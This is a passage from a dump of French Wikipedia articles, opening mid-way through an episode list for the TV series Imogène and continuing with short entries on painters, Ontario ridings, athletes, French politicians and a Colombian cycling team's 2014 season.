Imogène s'intéresse de près au cas de Mercier, touriste résident à l'Hôtel d'Angleterre. Il est terrorisé à l'idée d'avoir vu le fantôme d'un homme disparu 2 ans auparavant. Souhaitant l'aider, Imogène lui rend visite et le découvre pendu à son porte manteau. Aidée par Mulot, journaliste local venu écrire à Plouguirec un article sur le drame, ils mènent l'enquête.
Réalisateur.
François Leterrier
Scénariste.
Martin Lamotte
diffusion.
 sur TF1
3- "Encore vous, Imogène !" (1990).
Plouguirec, le village natal d'Imogène, est en effervescence : c'est le jour du match aller Plouguirec / Livarot. Imogène est bien entendu aux premières loges, mais elle n'aura pas l'occasion de suivre la rencontre jusqu'à la fin. En effet, pendant la mi-temps, un jeune homme qui ne ressemble guère à un supporter vient l'informer d'une étrange affaire : au collège Saint-Gonzague, où il enseigne, un meurtre se prépare. Il a à peine le temps de finir sa phrase qu'Imogène file vers l'établissement, où elle se fait passer pour le nouveau professeur de littérature française.
Réalisateur.
François Leterrier
diffusion.
 sur TF1
4- "Notre Imogène" (1990).
Marie-Jeanne Lelouet a bien des problèmes avec son père, Jaouen. Il s'oppose à son mariage avec Alain, un modeste mécanicien orphelin. Emue par la détresse de la jeune fille, Imogène tente de l'aider. Mais Alain décide de s'enfuir avec Marie-Jeanne.
Réalisateur.
Sylvain Madigan
diffusion.
 sur TF1
5- "Les fiançailles d’Imogène" (1990).
Imogène, cette vieille fille d'Imogène, se résigne à enterrer sa vie de garçon ! Elle a fait la connaissance du major Ervan qui séjourne à "l'Océan", le meilleur hôtel de Plougirec, bourgade du Finistère, la perle de la Bretagne ! Tous les habitants de Plougirec battent froid leur grande complice au "Café de la marine" là où a l'habitude de les retrouver celle qui, comme eux, boit sec et a le verbe haut.
Réalisateur.
Sylvain Madigan
diffusion.
29 mars 1990 sur TF1
6- "Imogène et la veuve blanche" (1990).
Pénélope Kermadec souhaite épouser Claude Benodet, son ami d'enfance, fils des gardiens du manoir familial. Mais celui-ci est parti faire un «tour du monde humanitaire» dont il n'est toujours pas revenu. Pénélope est fiancée de force à Georges Marchand, un brillant chercheur dans le domaine des algues par son Père. Imogène Le Dantec, toujours à l'affût du moindre mystère, s'intéresse à la disparition de Claude. Elle soupçonne le père et le nouveau fiancé de Pénélope d'avoir tué l'ancien fiancé et de l'avoir enterré dans le jardin de Marchand. Elle fait part de l'affaire à Trouillet. Mais Claude réapparaît alors mystérieusement.
Réalisateur.
Thierry Chabert
diffusion.
 sur TF1
7- "La malédiction d’Imogène" (1990).
Depuis des décennies, les morts se succèdent à Kerlankou, une vieille bâtisse isolée au bord de la falaise. Quand Imogène en hérite, elle se met en tête de prouver que ces histoires de fantômes et de malédiction sont des fables.
Réalisateur.
Thierry Chabert
diffusion.
24 février 1991 sur TF1
8- "36.15 Bise Marine" (1991).
Alors que l'amour frappe les héros de Plouguirec, sous forme de justes noces pour l'adjudant-chef Trouillet, et de pâmoison pour Imogène, qui soupire pour Philippe, son ami d'enfance, un chef mataï débarque de son Afrique natale pour venir prendre les eaux dans la petite ville bretonne. Peu après son arrivée, plusieurs jeunes femmes sont assassinées. Toutes offrent la capillaire particularité d'être rousses. Grâce à ses puissantes capacités d'investigation, Imogène découvre que les victimes, empoisonnées au curare, ont été débusquées par le tueur au moyen du minitel, sur la messagerie rose 36.15 Bise marine. La vaillante aventurière bretonne décide de se sacrifier pour sauver la vie de ses congénères.
Réalisateur.
Jean-Daniel Verhaeghe
diffusion.
7 novembre 1991 sur TF1
9- "Imogène dégaine" (1991).
Imogène est chargée d'une mission importante. Elle doit protéger Shankar, prince héritier du Bandharastrah, dont le père vient d'être assassiné par un mercenaire, Lulu le Balafré. Une terrible responsabilité, puisque Lulu est en France et qu'il a juré de tuer Shankar.
Réalisateur.
Thierry Chabert
diffusion.
 sur TF1
10- "Imogène et les légumes maudits" (1991).
L'inventeur d'un produit permettant de cultiver sur n'importe quelle terre des légumes, est assassiné. La DGSE craignant que la formule aux retombées considérables ne tombe entre de mauvaises mains, elle charge Imogène de mener l'Enquête, assistée de Trouillet et Quémeneur.
Réalisateur.
Jean-Daniel Verhaeghe
diffusion.
 sur TF1
11- "Imogène inaugure les chrysanthèmes" (1991).
Imogène doit retrouver et protéger un agent français passé au service de l'ennemi. Il a promis, en échange de l'impunité, de remettre à la France des documents secrets. Mais il est assassiné avant que la bouillante Bretonne n'ait pu le contacter.
Réalisateur.
Thierry Chabert
diffusion.
 sur TF1
12- "Vous êtes folle, Imogène" (1991).
Le colonel Hubert de Saint-Pierre est le seul, dans la salle de supervision du ministère de la Défense, à avoir vu un périscope émerger des eaux troubles de la Seine. Inquiet des remous que pourrait provoquer la révélation par un gradé d'une telle vision, le service d'intervention de la Marine nationale décide d'interner le colonel. Imogène, convoquée à Paris, est chargée d'une mission secrète qu'elle effectuera sous la couverture de Plouguirec Travel, une agence de voyages spécialisée en randonnées bretonnes. Au cours d'une petite fête aux échanges mouvementés, Imogène est internée, sous prétexte de cure de désintoxication, à la clinique des Glycines, où elle rencontre le colonel prétendument visionnaire.
Réalisateur.
Paul Vecchiali
diffusion.
 sur TF1
13- "Imogène contre-espionne (1996)".
Le Commandant Yves le Guellec, beau frère d'Imogène, a été enlevé par le redoutable espion surnommé "Le Hiéroglyphe". Imogène mène l’enquête...
Réalisateur.
Paul Vecchiali
diffusion.
 sur TF1
Accroche.
Le générique était interprété par Dominique Lavanant en personne. Il a marqué les esprits avec ses chœurs bretons et sa longueur.

</doc>
<doc id="7901527" url="https://fr.wikipedia.org/wiki?curid=7901527" title="TSAF">
TSAF



</doc>
<doc id="7901528" url="https://fr.wikipedia.org/wiki?curid=7901528" title="John Ward (peintre)">
John Ward (peintre)

John Ward, également connu comme John Ward of Hull, né le à Kingston-upon-Hull (Angleterre) et mort en 1849, est un peintre britannique.
Il a été décrit comme .
Biographie.
John Ward naît le à Kingston upon Hull. Il est le fils d'un maître marin, Abraham Ward, qui était également peintre. John reçoit une bonne éducation et est en apprentissage chez Thomas Meggitt pour devenir un peintre de maison. Vers 1836, Ward est listé dans le répertoire de la ville de Hull comme .
Il se marie avec Esther Leonard en 1825. Il est initié comme franc-maçon. Il devient un ami de l'artiste William Anderson.
Ward a exposé plusieurs peintures en 1827 au Hull and East Riding Institute for the Promotion of the Fine Arts. Il réalise par la suite de petites aquarelles et de plus grandes peintures à l'huile, principalement des scènes de bateau et de marine locale.
Il meurt le du choléra, mais son importance n'est connue qu'à partir de 1883, quand la presse locale fait un premier article sur lui.
Œuvres.
Plusieurs de ses œuvres sont conservées dans des collections publiques, dont la , le et la National Gallery of Art, à Washington.
Vol d'une œuvre en 2009.
En , "Schooners Ellen Crawford and Dwina" (1843) de John Ward est dérobée au Hull Maritime Museum. La peinture, évaluée à , est retrouvée trois mois plus tard, accrochée sur le mur de la salle à manger du voleur ; il a volé la peinture comme cadeau pour sa femme qui est également une artiste. Lors du procès, le juge de la Cour de la Couronne décrit la peinture comme .

</doc>
<doc id="7901531" url="https://fr.wikipedia.org/wiki?curid=7901531" title="Jussie à grandes fleurs">
Jussie à grandes fleurs



</doc>
<doc id="7901536" url="https://fr.wikipedia.org/wiki?curid=7901536" title="CJM Bourges Basket">
CJM Bourges Basket



</doc>
<doc id="7901545" url="https://fr.wikipedia.org/wiki?curid=7901545" title="Imogène (série TV)">
Imogène (série TV)



</doc>
<doc id="7901551" url="https://fr.wikipedia.org/wiki?curid=7901551" title="David Girandière">
David Girandière

David Girandière, né le à Caen (Calvados), est un entraîneur français de basket-ball.
Biographie.
En 2013, il obtient la montée en LFB d'UF Angers puis son maintien l'année suivante.
Avant-dernier du classement, Angers perd début décembre 2016 face à la lanterne rouge Tarbes, ce qui précipite son éviction et son remplacement par l'ancien joueur de Cholet David Gautier.
Carrière joueur.
Il a joué au SCM Le Mans, Coulaines et Anjou BC.

</doc>
<doc id="7901559" url="https://fr.wikipedia.org/wiki?curid=7901559" title="Spelaeornis formosus">
Spelaeornis formosus



</doc>
<doc id="7901560" url="https://fr.wikipedia.org/wiki?curid=7901560" title="Elachura">
Elachura



</doc>
<doc id="7901566" url="https://fr.wikipedia.org/wiki?curid=7901566" title="Harald Heinke">
Harald Heinke

Harald Heinke (né le ) est un judoka est-allemand. Il participe aux Jeux olympiques d'été de 1980. Il combat dans la catégorie des poids mi-moyens et remporte la médaille de bronze.

</doc>
<doc id="7901570" url="https://fr.wikipedia.org/wiki?curid=7901570" title="Beaches—East York (circonscription provinciale)">
Beaches—East York (circonscription provinciale)

Beaches—East York est une circonscription provinciale de l'Ontario représentée à l'Assemblée législative de l'Ontario depuis 1999. Elle est située dans la ville de Toronto.
Géographie.
La circonscription est située dans le sud de l'Ontario, plus précisément une partie de la ville de Toronto et sur la rive du lac Ontario.
Les circonscriptions limitrophes sont Don Valley-Est, Don Valley-Ouest, Scarborough-Sud-Ouest et Toronto—Danforth. 
Circonscription fédérale.
Depuis les élections provinciales ontariennes du 4 octobre 2007, l'ensemble des circonscriptions provinciales et des circonscriptions fédérales sont identiques.
Voir aussi.
Liens externes.
 Élections Ontario - Beaches—East York&lt;br&gt;

</doc>
<doc id="7901572" url="https://fr.wikipedia.org/wiki?curid=7901572" title="Bramalea—Gore—Malton (circonscription provinciale)">
Bramalea—Gore—Malton (circonscription provinciale)

Bramalea—Gore—Malton est une ancienne circonscription provinciale de l'Ontario représentée à l'Assemblée législative de l'Ontario depuis 2007. Elle est située dans le Grand Toronto.
Géographie.
La circonscription était située dans la région de Brampton et de Mississauga, dans la banlieue de Toronto. Dans cette circonscription se trouvait l'aéroport international Lester B. Pearson. 
Les circonscriptions limitrophes étaient Brampton—Springdale, Dufferin—Caledon, Etobicoke-Nord, Mississauga—Brampton-Sud et Vaughan. 
Circonscription fédérale.
Depuis les élections provinciales ontariennes du , l'ensemble des circonscriptions provinciales et des circonscriptions fédérales sont identiques.
Voir aussi.
Liens externes.
Élections Ontario - Description

</doc>
<doc id="7901577" url="https://fr.wikipedia.org/wiki?curid=7901577" title="Brampton—Springdale (circonscription provinciale)">
Brampton—Springdale (circonscription provinciale)

Brampton—Springdale est une ancienne circonscription provinciale de l'Ontario représentée à l'Assemblée législative de l'Ontario entre 2007 et 2018. 
Géographie.
La circonscription était située au sud de l'Ontario et se limite à la ville de Brampton, près de Toronto.
Les circonscriptions limitrophes étaient Bramalea—Gore—Malton, Brampton-Ouest, Dufferin—Caledon et Mississauga—Brampton-Sud.
Circonscription provinciale.
Depuis les élections provinciales ontariennes du , l'ensemble des circonscriptions provinciales et des circonscriptions fédérales sont identiques.
Voir aussi.
Liens externes.
Élections Ontario - Description

</doc>
<doc id="7901578" url="https://fr.wikipedia.org/wiki?curid=7901578" title="Brampton-Ouest (circonscription provinciale)">
Brampton-Ouest (circonscription provinciale)

Brampton-Ouest ( Brampton West) est une circonscription provinciale de l'Ontario représentée à l'Assemblée législative de l'Ontario depuis 2007. 
Géographie.
La circonscription est située au sud de l'Ontario et se limite à la ville de Brampton, près de Toronto.
En 2011, les circonscriptions limitrophes étaient Brampton—Springdale, Dufferin—Caledon, Mississauga—Brampton-Sud, Mississauga—Streetsville et Wellington—Halton Hills. Depuis 2015, les circonscriptions limitrophes sont Brampton-Sud, Wellington—Halton Hills, Dufferin—Caledon, Brampton-Nord et Brampton-Centre.
Circonscription fédérale.
Depuis les élections provinciales ontariennes du 4 octobre 2007, l'ensemble des circonscriptions provinciales et des circonscriptions fédérales sont identiques.
Voir aussi.
Liens externes.
 Élections Ontario - Brampton-Ouest&lt;br&gt;

</doc>
<doc id="7901587" url="https://fr.wikipedia.org/wiki?curid=7901587" title="William Anderson (peintre)">
William Anderson (peintre)

William Anderson, né en Écosse en 1757 et mort le , est un peintre britannique.
Biographie.
L'éducation d'Anderson comme constructeur de navire l'a bien préparé pour devenir un artiste spécialisé dans l'art maritime, inspiré par les maîtres hollandais du , même s'il peint aussi des paysages et des scènes rurales.
William Anderson et sa femme Sarah ont eu deux fils, William et George. William Guido Anderson a servi dans la Royal Navy et a été fatalement blessé lors de la bataille de Copenhague (1801), où il officiait comme "midshipman" à bord du . Son autre fils, George, était aussi un peintre.
Il déménage à Londres dans les années 1780 et expose pour la première fois à la Royal Academy en 1780, continue d'exposer annuellement jusqu'en 1811, puis sporadiquement jusqu'en 1834 (ou entre 1787 et 1814, selon le Dictionary of National Biography). Il est également exposé à la British Institution à partir de 1810.
Ses meilleures œuvres ont été réalisées dans les années 1790-1810, pendant les guerres de la Révolution française et napoléoniennes, où la demande en peinture navale était élevée. Sa peinture n'était cependant pas limitée au thème marin. Il fait ainsi la chronique des engagements navals, dont le mouvement de l'amiral Robert Calder au Cap Finisterre.
Des commissions qui ont ramené Anderson au nord l'ont présenté à l'école de peintres de Hull, où il rencontre le jeune John Ward, qu'il influence grandement. Il devient également ami avec Julius Caesar Ibbetson.
Œuvre.
Ses œuvres sont en général de petite taille, mais montrent des connaissances de marin. Il a peint l'intérieur de l'abbaye de Westminster et quelques paysages, mais ses thèmes principaux sont des scènes de rivière et de mer.
Selon la "", il a réalisé des dessins en vue d'être gravés, probablement sur des sujets maritimes, mais la grande majorité de ses œuvres sont des huiles sur toile. Le British Museum conserve une grande aquarelle de 1791, très représentative du peintre.
Cinq "Vues sur la bataille du Nil" ont été gravées en aquatinte par en 1800, à partir de leurs dessins.
Ses dernières œuvres montrent une meilleure maîtrise que ses premières œuvres, où il privilégiait le dessin à l'encre plutôt que l'aquarelle.
Il a réalisé un autoportrait, non daté, qui est conservé au National Maritime Museum.
Ses peintures historiques incluent :
Ses autres peintures maritimes incluent :
Autres peintures attribuées à William Anderson :

</doc>
<doc id="7901588" url="https://fr.wikipedia.org/wiki?curid=7901588" title="Parc provincial Bonnechère River">
Parc provincial Bonnechère River

Le Parc provincial Bonnechère River () est un parc provincial de l'Ontario situé dans le comté de Renfrew. Il protège une section de de la rivière Bonnechère, entre le parc provincial Algonquin et le parc provincial Bonnechère. 

</doc>
<doc id="7901590" url="https://fr.wikipedia.org/wiki?curid=7901590" title="A dix minutes de nulle part">
A dix minutes de nulle part



</doc>
<doc id="7901617" url="https://fr.wikipedia.org/wiki?curid=7901617" title="Aims (album)">
Aims (album)

Aims est le cinquième album studio de l'auteur-compositeur-interprète américaine Vienna Teng. Produit par Cason Cooley, l'album est sorti le .
Contexte.
L'album a été produit pendant que Teng étudiait l'entreprise durable à l'Institute Erb à l'Université du Michigan à Ann Arbor. Dans ses albums précédents, Teng a utilisé largement le piano, mais dans cet album, Teng utilise la sonothèque de Cooley, qui a les sons allant des instruments d'orchestre aux percussions africaines.

</doc>
<doc id="7901630" url="https://fr.wikipedia.org/wiki?curid=7901630" title="Briony Cole">
Briony Cole

Briony Christine Cole, née le à Melbourne, est une plongeuse australienne.
Carrière.
Lors des Jeux olympiques d'été de 2008 à Pékin, Briony Cole remporte avec Melissa Wu la médaille d'argent de l'épreuve du haut-vol à 10 mètres synchronisé.

</doc>
<doc id="7901631" url="https://fr.wikipedia.org/wiki?curid=7901631" title="Melissa Wu">
Melissa Wu

Melissa Paige Wu, née le à Penrith, est une plongeuse australienne.
Carrière.
Lors des Jeux olympiques d'été de 2008 à Pékin, Melissa Wu, qui est alors la plus jeune sportive de la délégation australienne, remporte avec Briony Cole la médaille d'argent de l'épreuve du haut-vol à 10 mètres synchronisé. Elle se classe aussi sixième de l'épreuve individuelle de haut-vol à 10 mètres lors de ces Jeux. Quatre ans plus tard, à Londres, elle termine quatrième du concours olympique de haut-vol à 10 mètres.

</doc>
<doc id="7901637" url="https://fr.wikipedia.org/wiki?curid=7901637" title="Eliseo Verón">
Eliseo Verón

Eliseo Verón, né le à Buenos Aires et mort le dans la même ville, est un sémioticien, anthropologue et sociologue argentin.
Biographie.
Après des études de philosophie à Buenos-Aires, grâce à une bourse du Conicet (Consejo Nacional de Investigaciones Científicas y Técnicas), Eliseo Verón travaille durant deux ans à Paris au Laboratoire d’anthropologie sociale de l’École pratique des hautes études. Il rencontre Claude Lévi-Strauss, dont il traduit en espagnol le livre "Anthropologie structurale". De retour en Argentine il est professeur à l’université de Buenos Aires pendant deux ans. En 1971 il revient s’installer en France. Il soutient, en 1988, une thèse de doctorat d’État en sciences de l’information et de la communication à Paris-VIII : "La sémiosis sociale : Fragments d’une théorie de la discursivité." Professeur dans cette discipline, il dirige le département de sciences de l’information et de la communication. 
Il repart en Argentine en 1995 ; il est professeur, puis professeur honoraire, à l’université de San Andrés.
Travaux.
Apport de ses recherches.
La revue Communication &amp; langages consacre en 2018 un numéro spécial aux travaux de Eliseo Verón. De l'article introductif quelques appréciations :
Si l’apport épistémologique d’Eliseo Verón – qui s’est résolument placé « à l’intersection des disciplines » – demeure fondamental pour les sciences de l’information et de la communication, Suzanne de Cheveigné note toutefois qu’il n’a pas encore trouvé la reconnaissance qu’il méritait auprès de la communauté scientifique française.
Il proposait une distinction entre les sociétés médiatiques modernes caractérisées par des médias assimilés à tort à des « miroirs » du réel et les sociétés médiatisées postmodernes (où l’ensemble des pratiques culturelles se structurent en relation directe avec l’existence des médias).
Une citation de Verón .
Un modèle sémio-anthropologique.
L'exemple sans doute le plus éclatant de la perspective sémio-anthropologique dessinée par Eliseo Verón réside dans un ouvrage qu'il fait paraître en 1981 sous le titre "Construire l'événement. Les médias et l'accident de Three Mile Island". Dans ce travail monographique, l'auteur s'intéresse à un accident tristement célèbre survenu dans une centrale nucléaire de Pennsylvanie en mars 1979. L'auteur fixe son attention sur le traitement médiatique de l'affaire à la radio, dans les journaux et à la télévision française. Il nous montre que les journalistes et les rédactions, après une installation rapide du sujet, usent progressivement de procédés rhétoriques tendant à dramatiser l'affaire, notamment par l'emploi d'un vocabulaire alarmiste (catastrophe, évacuation, panique...) ou par l'usage d'un principe d'association avec d'autres événements survenus dans l'actualité. En creux, ce que nous montre l'auteur à propos de cette affaire, c'est que le discours médiatique mérite parfois d'être suspecté d'un manque de légitimité et d'objectivité. Mais que les médias eux-mêmes peuvent aussi s'interroger sur leur propre légitimité et leur propre objectivité quand ils traitent d'un sujet d'actualité.

</doc>
<doc id="7901654" url="https://fr.wikipedia.org/wiki?curid=7901654" title="Saison 2014 de l'équipe cycliste Movistar Team América">
Saison 2014 de l'équipe cycliste Movistar Team América

La saison 2014 de l'équipe cycliste Movistar Team América est la quatrième de cette équipe cycliste Colombienne. L'équipe est créée en 2011 avec le statut d'équipe continentale. À cette date, elle est la filiale de l'équipe World Tour espagnole Movistar. En 2013, à la suite du désengagement de l'équipe espagnole, les succursales colombienne et équatorienne de la firme Movistar décident de sponsoriser la formation qui redémarre au plus haut national en Colombie. En 2014, seule la succursale colombienne sponsorise l'équipe.
Avant-saison.
Arrivées et départs.
Au mois de janvier, le manager général Libardo Leyton annonce trois premiers coureurs venant renforcer l'effectif. Deux transfuges sont issus de la formation Formesán - Bogotá Humana - ETB, Juan David Vargas et Óscar Pachón. Vargas, spécialiste du contre-la-montre, a remporté la ' et ses qualités de grimpeur lui ont permis de rentrer dans le ' du dernier Clásico RCN. Pachón est plus expérimenté. Il a porté le maillot d'équipes italienne et chilienne, et son domaine de prédilection est la moyenne montagne. Le troisième renfort est Cristian Talero, sprinteur, il a remporté une étape et le classement des étapes volantes au Clásico RCN, avec la formation des Forces armées colombiennes. Principal objectif du recrutement de la nouvelle équipe continentale équatorienne, Movistar Team América perd, cependant, Byron Guamá au profit de la formation Ecuador. À la présentation officielle de l'équipe, deux mois plus tard, ce sont, finalement, six nouvelles recrues qui intègrent la formation. Aux trois pré-cités, il faut ajouter deux Espoirs, Roller Diagama et Luis Miguel Martínez. Ainsi qu'un sixième renfort, le sprinter italien Marco Zamparella. Officiant la saison précédente dans l'équipe italo-hongroise Utensilnord Ora24.eu, il participe, avec celle-ci, au Tour de Colombie 2013. C'est son directeur sportif Franco Gini, devenu entre-temps directeur technique des sélections colombiennes, qui lui a permis de trouver ce contrat en Colombie.
Matériel.
La formation est équipée par la marque de cycles américaine Cannondale Bicycle Corporation, elle utilise le vélo Cannondale EVO 22. La société Endura procure les nouveaux maillots pour la saison 2014. Tandis que l'entreprise CatLike fournit les casques et Adidas les lunettes.
Programme et perspectives pour la saison.
Pour la quatrième année, l'entreprise de télécommunications Telefónica sponsorise la formation. Après avoir remporté, en 2013, les deux épreuves majeures du calendrier national équatorien (la ' et le Tour de l'Équateur), terminé vice-champion du Clásico RCN, le manager général Libardo Leyton affronte avec optimisme la nouvelle saison.Lors de la présentation de l'équipe au siège social de "Movistar Colombia", à Bogota, en présence du président exécutif de la firme, Libardo Leyton annonce avoir renforcé une formation qui a donné satisfaction l'année précédente, pour obtenir les succès escomptés dans les courses nationales et internationale, avec l'arrivée de Pachón, Talero et Vargas. De plus, avec le recrutement de Diágama et de Martínez pour épauler Brayan Ramírez, la formation pourra, et ce pour la première fois, disposer d'une équipe en son nom propre pour disputer la ' (le Tour de Colombie Espoir). Jessica Parra, championne du monde junior de la course scratch en 2013, est l'unique féminine, intégrée au groupe. La volonté des dirigeants est de lui apporter l'aide et l'attention nécessaire pour sa progression, en vue des prochains Jeux olympiques.
Déroulement de la saison.
Quelques jours avant de reprendre la compétition, leur sponsor convie l'équipe au complet à une promenade à bicyclette, la ' qui rassemble environ personnes dans le sud de la capitale '. Initiative qui permet aux coureurs de la formation de se mêler à la foule des ', et à ceux-ci de les côtoyer.La formation dispute sa première course de la saison à l'occasion de la ', début avril. Jessica Parra y est engagée ainsi que onze des douze membres de l'effectif masculin (dont deux dans une équipe appelée "mixte 1", comprenant également des membres de la formation 4-72 Colombia ). La nouvelle recrue italienne Marco Zamparella et les Colombiens Omar Mendoza et Brayan Ramírez réussissent un bon contre-la-montre, en se classant troisième, quatrième et sixième, places qu'ils détiennent, également, au classement général provisoire. Deux jours plus tard, au terme de la compétition, Mendoza conserve sa quatrième place et termine premier de l'équipe, devant Ramírez cinquième, tandis que l'Italien est contraint à l'abandon (surement éliminé comme la cinquantaine de coureurs ayant perdu un tour sur le peloton principal). Les deux dernières étapes offrent quelques satisfactions. Quatre hommes se classent dans les neuf premiers, le samedi et Óscar Pachón termine troisième, le lendemain. Alors que Juan David Vargas, victime d'une chute dans la deuxième étape, est contraint d'effectuer un séjour à l'hôpital qui s'éternise puisque trois semaines plus tard, le coureur était encore dans un établissement hospitalier de Cali.
La semaine suivante ont lieu les Championnats de Colombie sur route. Malgré de nombreux dysfonctionnements dans l'organisation, deux membres de la formation obtiennent une médaille lors des épreuves du contre-la-montre. Brayan Ramírez termine troisième de la course Espoir. Il échoue à vingt-trois secondes du titre. Quelques minutes plus tard, Omar Mendoza fait mieux que son coéquipier. À seulement quinze secondes du vainqueur Pedro Herrera, il obtient la médaille d'argent de la course Élite, pour quelques centièmes face à Víctor Hugo Peña. Deuxième engagé, Marvin Angarita termine également dans le "" de la compétition.Jessica Parra, quant à elle, termine septième à quarante-cinq secondes de la médaille de bronze. Le lendemain, Parra fait partie du peloton qui se dispute le titre, de la course en ligne, au sprint. Elle termine quatorzième.Puis c'est au tour des Espoirs de disputer leur épreuve. Sous une chaleur étouffante, un premier groupe d'une vingtaine d'hommes s'échappe. Rapidement trois coureurs s'en extraient. Le trio devient duo. À deux tours de l'arrivée, Brayan Ramírez et Diego Ochoa obtiennent jusqu'à deux minutes d'avance. Écart suffisant pour se disputer le titre en tête-à-tête. Ochoa dispose de Ramírez pour quelques millimètres seulement.Le dernier jour, les Élites masculins en décousent sur le même tracé mais avec dix tours à effectuer (soit un de plus que les Espoirs). Au sixième, quatorze hommes prennent le large. Ils vont compter jusqu'à d'avance. Óscar Pachón fait partie de l'échappée, réduite à neuf hommes, qui se disputent le titre, quatre tours plus tard. Il échoue au pied du podium à la quatrième place. Les trois autres membres de la formation au départ terminent dans le peloton à trente-huit secondes du vainqueur.Malgré l'absence de titre, l'équipe est la seule du peloton colombien à obtenir plus d'une médaille, avec trois médailles. Tandis que Brayan Ramírez est le seul coureur à décrocher deux récompenses, lors de ces championnats.

</doc>
<doc id="7901659" url="https://fr.wikipedia.org/wiki?curid=7901659" title="Henri Brière">
Henri Brière

Henri Brière, né le à Flers (Orne) et mort le à Oran (Algérie), est un homme politique français.
Exploitant viticole, il est député de l'Algérie française de 1928 à 1936, inscrit au groupe de l'action démocratique et sociale, puis au centre républicain.

</doc>
<doc id="7901662" url="https://fr.wikipedia.org/wiki?curid=7901662" title="Michel Parès">
Michel Parès

Michel Parès, né le à Rivesaltes (Pyrénées-Orientales) et mort le à Paris, est un homme politique français.
Biographie.
Né à Rivesaltes, Michel Parès se fixe à Oran où il exerce la profession d'avocat. 
La guerre mondiale lui vaut la Croix de guerre 1914-1918 (France) et la Légion d'honneur. Déjà conseiller municipal d'Oran, le décès du docteur Jules Molle, député de la circonscription d'Oran, lui donne l'occasion de se présenter à l'élection législative partielle du 22 mars 1931. Sur 27304 inscrits et 19024 votants, il recueille 10393 voix contre 6689 au candidat socialiste Dubois, directeur d'école et 1641 à Gandolphe.
Inscrit au groupe de la fédération républicaine présidé par Louis Marin, Michel Parès fait partie de la commission de législation civile et criminelle.
De nouveau candidat aux élections générales de mai 1932, il arrive en tête au premier tour de scrutin avec 8.698 voix sur 21.124 votants et 29.853 inscrits, devant le socialiste Dubois, (6166 voix), le républicain de gauche Navarro (3800 voix), le radical-socialiste Chabert, radical-socialiste (2040 voix) et le communiste Terrecillas (420 voix). Le second tour confirme son succès et il est élu avec 10981 voix contre 9879 à Dubois et 1411 à Navarro, sur 22482 votants.
Membre des commissions de l'Algérie et des colonies, de la marine militaire et des boissons, puis des commissions de législation civile et criminelle et des travaux publics, il dépose de nombreuses propositions de loi en faveur des sinistrés de Tunisie, des entrepreneurs de défrichement victimes de la loi de 1932 sur la viticulture, protégeant la marine marchande augmentant le nombre des conseillers à la Cour d'appel d'Alger, étendant la compétence des juges de paix en Algérie.
Michel Parés rédige beaucoup de rapports sur des textes concernant l'Algérie : fonds commun des sociétés indigènes de prévoyance, secours et prêts mutuels, classement et construction de routes sur décision du gouvernement général, agrandissement vers l'Ouest du port d'Oran, conservation des postes militaires pour la défense des côtes et la sécurité de la navigation, etc..
Il interpelle le gouvernement sur la protection des viticulteurs français contre la concurrence étrangère et sur les restrictions arbitraires apportées par le ministère de l'Education nationale à la liberté de l'enseignement dans les lycées et collèges.
Il intervient souvent, et notamment au sujet du projet concernant la viticulture et le commerce des vins en 1933 où il défend les intérêts des producteurs algériens lésés par les interdits de production et les importations étrangères. Il soutient le projet portant organisation et défense du marché du blé et celui destiné à l'assainissement du marché des vins.
Il ne se représente pas aux élections générales de 1936 et son siège passe à son adversaire de 1931 et 1932, le socialiste Dubois.
Il reçoit la Francisque.
En 1944, il est nommé conseiller général de la Seine (département) pour le 4ème arrondissement de Paris (Quartier de l'Arsenal). 
À la suite de son décès survenu le 3 novembre 1966, Michel Parès est inhumé à Autignac dans le caveau de la famille Alcide Pastre, sa belle-famille.

</doc>
<doc id="7901667" url="https://fr.wikipedia.org/wiki?curid=7901667" title="Raymond Laquière">
Raymond Laquière

Raymond Laquière, né le à Alger et mort le à Saint-Martin-le-Vieil (Aude), est un homme politique français.
Biographie.
Fils du général Laquière, qui fut un adjoint de Lyautey, il poursuit ses études au grand lycée d'Alger. Il est avocat à Alger. Conseiller général, maire de Saint-Eugène (Alger), il est député d'Algérie de 1928 à 1932, inscrit au groupe de l'action démocratique et sociale.
Il siège à l'Assemblée algérienne de 1948 à 1954, au sein de l'intergroupe des libéraux.

</doc>
<doc id="7901671" url="https://fr.wikipedia.org/wiki?curid=7901671" title="Towers of Channelside">
Towers of Channelside

Towers of Channelside est un ensemble de deux tours résidentielles du centre-ville ("Downtown") de Tampa, en Floride. 
Conçu par l'agence Curts Gaines Hall Jones, il a été construit entre 2005 et 2007 pour un coût de 93 millions de dollars. Chacun des deux bâtiments mesure environ de haut, compte vingt-neuf étages, et comprend 125 logements. Le projet comporte également une surface commerciale, un important centre de remise en forme et un parking avec deux places par appartement.
Les règlements d'urbanisme qui limitaient la hauteur des constructions à ont été modifiés pour permettre la construction de ce complexe. Le projet a rencontré des oppositions du fait que les tours bloquaient la vue et l'accès public à la Baie de Tampa et aggravaient la congestion du trafic routier dans le secteur. 
Le , juste deux jours après que le projet a été approuvé, 250 des 260 appartements de l'ensemble avaient été réservés. A la fin de la construction en 2007 le prix des appartements allait de à .

</doc>
<doc id="7901673" url="https://fr.wikipedia.org/wiki?curid=7901673" title="Christadelphes">
Christadelphes



</doc>
<doc id="7901683" url="https://fr.wikipedia.org/wiki?curid=7901683" title="Louis Maurice Antoine Clerc">
Louis Maurice Antoine Clerc

Louis Maurice Antoine Clerc est un homme politique français né le à La Sône (Isère) et mort le à Valence (Drôme).
Avocat, il est maire de Valence en et député de la Drôme de 1871 à 1876, siégeant au groupe de la gauche républicaine.

</doc>
<doc id="7901686" url="https://fr.wikipedia.org/wiki?curid=7901686" title="Caressa Savage">
Caressa Savage

Caressa Savage, née le à Fort Lauderdale en Floride, est une actrice pornographique américaine.
Biographie.
Elle tournait principalement des scènes lesbiennes.
L'actrice pornographique américaine Angie Savage porte le même nom.

</doc>
<doc id="7901693" url="https://fr.wikipedia.org/wiki?curid=7901693" title="Manolo Poulot">
Manolo Poulot

Manolo Poulot (né le à Guantánamo) est un judoka cubain. Il participe aux Jeux olympiques d'été de 2000 en combattant dans la catégorie des poids de moins de 60 kg et remporte la médaille de bronze. Au cours de sa carrière, il devient également champion du monde en 1999.

</doc>
<doc id="7901706" url="https://fr.wikipedia.org/wiki?curid=7901706" title="Effectif actuel du Lightning de Tampa Bay">
Effectif actuel du Lightning de Tampa Bay



</doc>
<doc id="7901707" url="https://fr.wikipedia.org/wiki?curid=7901707" title="Conseil d'État du Tessin">
Conseil d'État du Tessin



</doc>
<doc id="7901711" url="https://fr.wikipedia.org/wiki?curid=7901711" title="Kāhili">
Kāhili

